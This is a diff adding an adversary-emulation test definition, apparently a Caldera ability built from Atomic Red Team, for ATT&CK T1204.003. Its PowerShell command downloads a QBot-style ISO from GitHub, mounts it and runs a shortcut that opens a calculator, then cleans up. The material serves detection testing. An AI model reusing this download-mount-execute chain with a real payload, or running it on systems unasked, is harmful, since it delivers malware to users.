@@ -1,0 +1,22 @@
+---
+- id: b939c81cba750f4b3ef67e6b0456b41e
+  name: Malicious Execution from Mounted ISO Image
+  description: Adversaries may rely on a user running a malicious image to facilitate
+    execution
+  tactic: execution
+  technique:
+    attack_id: T1204.003
+    name: 'User Execution: Malicious Image'
+  platforms:
+    windows:
+      psh:
+        command: IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso"
+          -OutFile "$env:TEMP\qbot-test.iso"); Mount-DiskImage -ImagePath "$env:TEMP\qbot-test.iso";
+          $mountedpath = (Get-DiskImage -ImagePath "$env:TEMP\qbot-test.iso" | Get-Volume).DriveLetter;
+          $finalpath = $mountedpath + ":\"; cd $finalpath; .\calc.exe.lnk
+        payloads: []
+        cleanup: start-sleep -s 5; stop-process -Name "Calculatorapp" -Force ; dismount-diskimage
+          -ImagePath "$env:TEMP\qbot-test.iso"
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
